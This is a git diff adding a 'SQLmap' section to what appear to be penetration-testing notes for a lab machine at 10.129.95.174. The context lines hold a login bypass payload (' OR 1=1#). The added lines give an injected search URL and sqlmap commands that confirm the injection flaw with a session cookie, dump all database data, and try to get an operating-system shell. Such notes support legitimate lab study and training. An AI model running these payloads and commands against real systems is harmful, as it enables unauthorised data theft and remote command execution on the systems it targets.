@@ -8,6 +8,22 @@ Username: Administrator
 Password: ' OR 1=1#
 ```
 
+## SQLmap
+Below example is a search engine on website for authenticated users:
+```
+# URL to search:
+# http://10.129.95.174/dashboard.php?search=ELI%27+OR+1%3D1%23
+
+# basic scan to confirm vuln
+sqlmap --url http://10.129.95.174/dashboard.php?search= --cookie="PHPSESSID=sessioncookie"
+
+# dump data
+sqlmap --url http://10.129.95.174/dashboard.php?search= --cookie="PHPSESSID=sessioncookie" --all
+
+# try to get command execution
+sqlmap --url http://10.129.95.174/dashboard.php?search= --cookie="PHPSESSID=sessioncookie" --os-shell
+```
+
 ## SQLserver
 
 ### RCE
